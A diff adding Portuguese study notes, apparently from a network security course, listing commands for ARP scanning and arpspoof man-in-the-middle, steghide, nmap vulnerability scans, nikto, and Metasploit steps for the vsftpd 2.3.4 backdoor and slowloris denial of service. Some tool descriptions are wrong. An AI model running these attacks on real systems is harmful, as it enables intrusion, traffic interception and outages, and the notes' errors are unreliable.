@@ -1,0 +1,84 @@
+ARP: Acha o indereço físico a partir do IP, manda um broadcast pedindo  a alvo retorna 
+	arp -a
+	arp-scan --interface=wlp58s0 --localnet
+	arpspoof -i <INTERFACE REDE> -t<IP_DO_ALVO> <IP_DO_GATEWAY > (man in the middle por trocar na tabela arp)
+	
+TCP: Aula2-13 pra tabela e roteiro 1
+	tcp dump: Aula2-23
+	tipos Roteiro1-5
+	
+
+pstree
+
+ls -l
+
+steghide embed -cf IMAGEM -ef TEXTO
+steghide extract -sf ARQUIVO
+
+sudo nmap IP
+-sT : tcps abertas
+-sV : versão	
+-O  : OS
+-p  : portas
+-sV  - -script vuln : script de vulnerabilidade
+-v --script malware : script de malwares
+-sS : sniffing, vai com cuidado
+-sC : standard scripsts
+-sC -sV -a -O
+
+
+nikto -h IP
+
+	Display X mostra os controles de saída do nikto
+	1- Mostra os redirecionamentos
+	2- Mostra cookies recebidos
+	3- Mostra todas as respostas
+	4- Mostras URLs que exigem autenticação
+	D- Saída de depuração
+	V- Saída detalhada
+
+	Tuning – as opções de teste que o Nikto usará contra um alvo.
+	0 - Upload de arquivo
+	1 - Arquivo Interessante / Visto nos logs
+	2 - Configuração incorreta / arquivo padrão
+	3 - Divulgação de Informações
+	4 - Injeção (XSS / Script / HTML)
+	5 - Recuperação Remota de Arquivos - Raiz Interna da Web
+	6 - Negação de Serviço
+	7 - Recuperação Remota de Arquivos - Server Wide
+	8 - Execução de Comando / Shell Remoto
+	9 - Injeção SQL
+	a - Autenticação Desvio
+	b - Identificação de Software
+	c - Inclusão remota de fontes
+
+telnet IP : pega a versão das ports
+
+wafw00f IP : pega os servidores DNS
+	-a : ?
+	-v : ?
+
+nslookup IP : pega os servidores DNS
+
+webtech -u  : pega as tecnologias do site
+
+net discover
+
+msf: 
+	msfdb init
+	msfconsole
+	use exploit/unix/ftp/vsftpd_234_backdoor
+	show targets
+	set target 0
+	set rhosts IP
+	exploit
+
+	db_nmap -v --script vuln IPDOALVO
+	use auxiliary /dos/http/slowloris
+	set rhosts IP
+	run
+
+rlogin -l root IPDOALVO
+log Roteiro3-9
+SUID Aula4-17
+md5 sum
